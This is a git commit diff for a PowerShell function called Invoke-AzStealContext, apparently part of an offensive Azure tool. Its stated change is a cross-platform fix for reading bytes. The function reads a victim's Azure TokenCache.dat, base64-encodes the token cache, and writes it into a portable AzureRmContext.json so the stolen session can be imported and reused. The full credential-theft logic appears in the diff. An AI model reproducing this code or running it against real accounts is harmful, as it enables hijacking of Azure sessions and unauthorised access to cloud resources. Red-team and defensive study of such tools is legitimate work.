c435d3a4735ea36d23967e5aa952154efeb5d21a
Justin Perdok <justin-p@users.noreply.github.com>
2020-09-02 17:36:07 +0200

    Cross platform fix.

--- Invoke-AzStealContext.ps1
+++ Invoke-AzStealContext.ps1
@@ -32,33 +32,33 @@ Function Invoke-AzStealContext {
             $PSCmdlet.ThrowTerminatingError($PSItem)
         }     
     }
-    Process {
-        Try {
-            $bytes = Get-Content $(Join-Path $Path "TokenCache.dat") -Encoding byte
-            $b64 = [Convert]::ToBase64String($bytes)
-            $AzureRmContext = Get-Content $(Join-Path $Path "AzureRmContext.json") | ConvertFrom-Json
-            If (($AzureRmContext.contexts.PSObject.Properties.Name).count -gt 1) {
-                $Contexts = $AzureRmContext.contexts.PSObject.Properties.Name
-                Write-host "Detected multiple contexts."
-                do { 
-                    Write-Host $Message
-                    $index = 1
-                    foreach ($Context in $Contexts) {
-                        Write-Host "[$index] $($Context)"
-                        $index++
-                    }   
-                    $selection = Read-Host "Select the context to use as default."
-                } until ($Contexts[[int]$selection-1])
-                $DefaultContext = $Contexts[$selection-1]
-            }
-            ForEach ($context in $AzureRmContext.contexts.PSObject.Properties.Name) {
-                $AzureRmContext.DefaultContextKey = $DefaultContext
-                $AzureRmContext.Contexts.$($context).TokenCache.CacheData = $b64
-            }
-            $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
-        } Catch {
-            $PSCmdlet.ThrowTerminatingError($PSItem)
+    Process { 
+        if ($PSVersionTable.PSVersion.Major -eq 5) {
+            $bytes = Get-Content $(Join-Path $Path "TokenCache.dat") -Encoding Byte
+        } ElseIf ($PSVersionTable.PSVersion.Major -gt 5) {
+            $bytes = Get-Content $(Join-Path $Path "TokenCache.dat") -AsByteStream
         }
+        $b64 = [Convert]::ToBase64String($bytes)
+        $AzureRmContext = Get-Content $(Join-Path $Path "AzureRmContext.json") | ConvertFrom-Json
+        If (($AzureRmContext.contexts.PSObject.Properties.Name).count -gt 1) {
+            $Contexts = $AzureRmContext.contexts.PSObject.Properties.Name
+            Write-host "Detected multiple contexts."
+            do { 
+                Write-Host $Message
+                $index = 1
+                foreach ($Context in $Contexts) {
+                    Write-Host "[$index] $($Context)"
+                    $index++
+                }   
+                $selection = Read-Host "Select the context to use as default."
+            } until ($Contexts[$selection-1])
+            $DefaultContext = $Contexts[$selection-1]
+        }
+        ForEach ($context in $AzureRmContext.contexts.PSObject.Properties.Name) {
+            $AzureRmContext.DefaultContextKey = $DefaultContext
+            $AzureRmContext.Contexts.$($context).TokenCache.CacheData = $b64
+        }
+        $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
     }
     End {
         If ($ImportContext) {
